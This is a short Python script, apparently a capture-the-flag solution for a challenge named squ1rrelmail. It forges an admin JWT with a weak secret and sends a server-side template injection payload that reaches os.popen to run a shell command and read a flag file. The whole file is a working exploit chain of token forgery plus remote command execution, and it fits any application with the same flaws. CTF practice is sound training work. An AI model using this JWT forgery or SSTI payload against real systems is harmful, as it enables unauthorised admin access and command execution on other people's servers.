import requests
import jwt
import re

url = "http://squ1rrelmail.squ1rrel.dev"
s = requests.Session()

# cookie secret: squirrel
# admin login
token = jwt.encode(
    payload={
        "username": "admin",
        "role": "admin",
        "exp": 1776568623
    },
    key='squirrel',
    algorithm='HS256'
)

print("> Token:", token)
s.cookies.set('token', token)

# ssti
cmd = 'cat /flag.txt'
payload = "self.__init__.__globals__.__builtins__['__import__']('os').popen('%s').read()" % cmd

res = s.get(f'{url}/acorn-inbox', params={
    'acorn': '{{ %s }}' % payload
})

flag = re.findall(r'(squ1rrel{.+})', res.text)[0].strip()
print("Flag:", flag)